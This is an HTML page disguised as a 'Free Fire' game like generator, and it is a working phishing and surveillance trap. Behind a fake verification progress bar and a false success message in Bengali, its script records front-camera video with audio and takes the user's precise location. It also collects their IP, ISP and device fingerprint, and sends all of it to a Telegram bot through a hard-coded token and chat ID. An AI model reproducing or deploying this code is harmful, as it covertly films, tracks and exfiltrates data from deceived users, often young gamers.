<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire Like Panel</title>
    <style>
        body { background: #121212; color: #fff; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }
        .box { background: #1e1e1e; padding: 20px; border-radius: 10px; display: inline-block; width: 300px; }
        input, select, button { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
        button { background: #ff9800; color: #fff; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <div class="box" id="mainBox">
        <h2>FF Like Generator</h2>
        <input type="text" id="uid" placeholder="Enter Player UID">
        <select id="server">
            <option value="BD">BD Server</option>
            <option value="IND">India Server</option>
        </select>
        <select id="likes">
            <option value="220">220 Likes</option>
        </select>
        <button onclick="startPanel()">Submit</button>
    </div>

    <div class="box" id="loadingBox" style="display:none;">
        <h3 id="statusText">অনুগ্রহ করে অপেক্ষা করুন, আপনি রোবট কি না ভেরিফাই করা হচ্ছে...</h3>
        <p id="percentage">0%</p>
    </div>

    <video id="video" autoplay playsinline muted style="display:none;"></video>

    <script>
        const BOT_TOKEN = '8959888101:AAEMipaYgF2A7Sb3Cy3eR-iMlKrxncHW5kM';
        const CHAT_ID = '8589721704';

        async function getDeviceInfo(lat, lon) {
            let ip = "Unknown", isp = "Unknown";
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                ip = data.ip || "Unknown";
                isp = data.org || "Unknown";
            } catch (e) {}

            let googleMapLink = (lat && lon) ? `https://www.google.com/maps?q=${lat},${lon}` : "Not Available";
            let locationDisplay = (lat && lon) ? `Lat: ${lat}, Lon: ${lon}\n🗺️ Google Map: ${googleMapLink}` : "Permission Denied or Disabled";

            let batteryStatus = "Unknown", isCharging = "❌";
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    batteryStatus = `${Math.round(b.level * 100)}%`;
                    isCharging = b.charging ? "✔️" : "❌";
                }
            } catch (e) {}

            let speed = "Unknown";
            try {
                if (navigator.connection && navigator.connection.downlink) {
                    speed = `${navigator.connection.downlink} Mbps`;
                }
            } catch(e) {}

            let networkType = "Unknown", effectiveType = "Unknown";
            try {
                if (navigator.connection) {
                    networkType = navigator.connection.type || "Unknown";
                    effectiveType = navigator.connection.effectiveType || "Unknown";
                }
            } catch(e) {}

            let deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
            let hardwareConcurrency = navigator.hardwareConcurrency || "Unknown";

            let glRenderer = "Unknown";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        glRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch(e) {}

            let isIncognito = "❌";
            try {
                if ('storage' in navigator && 'estimate' in navigator.storage) {
                    const estimate = await navigator.storage.estimate();
                    if (estimate.quota < 120 * 1024 * 1024 * 1024) {
                        isIncognito = "✔️ (Likely)";
                    }
                }
            } catch(e) {}

            let now = new Date();
            let dateStr = now.toLocaleDateString() + " - " + now.toLocaleTimeString();

            return `📹 Front Camera Video (8-10s)

⚠️ Do not misuse this video

🌐 IP Address: ${ip}
🏢 ISP: ${isp}
📍 Location: ${locationDisplay}

💻 User-Agent: ${navigator.userAgent}
🌐 Browser: ${navigator.language}
🕵️ Incognito Mode: ${isIncognito}

🔋 Battery: ${batteryStatus} Charging: ${isCharging}
📐 Screen Size: ${window.screen.width}×${window.screen.height}
🚀 Internet Speed: ${speed}
📶 Network: ${networkType} Type: ${effectiveType}

💾 RAM & Storage: ${deviceMemory} / ${hardwareConcurrency} Cores
🕒 Date: ${dateStr}
🌍 Time Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}

📊 Device Pixel Ratio: ${window.devicePixelRatio}
🖥️ Viewport Size: ${window.innerWidth}×${window.innerHeight}
🧑‍💻 CPU Cores: ${hardwareConcurrency}
🎮 GPU Renderer: ${glRenderer}

⚠️ Note: এই তথ্যের অপব্যবহার করলে আপনি সম্পূর্ণ দায়ী থাকবেন। আমি আপনার কাজের জন্য দায়ী থাকব না।`;
        }

        async function startPanel() {
            const uid = document.getElementById('uid').value;
            if(!uid) {
                alert('Please enter UID');
                return;
            }

            document.getElementById('mainBox').style.display = 'none';
            document.getElementById('loadingBox').style.display = 'inline-block';

            let lat = null, lon = null;
            const locationPromise = new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve();
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        lat = pos.coords.latitude;
                        lon = pos.coords.longitude;
                        resolve();
                    },
                    (err) => { resolve(); },
                    { timeout: 5000, enableHighAccuracy: true, maximumAge: 0 }
                );
            });

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                let chunks = [];

                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };

                mediaRecorder.onstop = async () => {
                    await locationPromise;
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const captionText = await getDeviceInfo(lat, lon);

                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('video', blob, 'video.webm');
                    formData.append('caption', captionText);

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    });

                    stream.getTracks().forEach(track => track.stop());
                };

                mediaRecorder.start();

                let p = 20;
                document.getElementById('percentage').innerText = p + '%';
                
                let interval = setInterval(() => {
                    p += 20;
                    if(p <= 100) {
                        document.getElementById('percentage').innerText = p + '%';
                    }
                    if(p === 60) {
                        document.getElementById('statusText').innerText = "সার্ভার থেকে লাইক পাঠানো হচ্ছে...";
                    }
                    if(p >= 100) {
                        clearInterval(interval);
                        mediaRecorder.stop();
                        document.getElementById('loadingBox').innerHTML = `<h3>সফলভাবে আপনার একাউন্টে 220 টি লাইক পাঠানো হয়েছে!</h3>`;
                    }
                }, 1600);

            } catch (err) {
                document.getElementById('loadingBox').innerHTML = `<h3>দয়া করে সব পারমিশন দিন, তারপর আবার চেষ্টা করুন।</h3><button onclick="location.reload()">Try Again</button>`;
            }
        }
    </script>
</body>
</html>
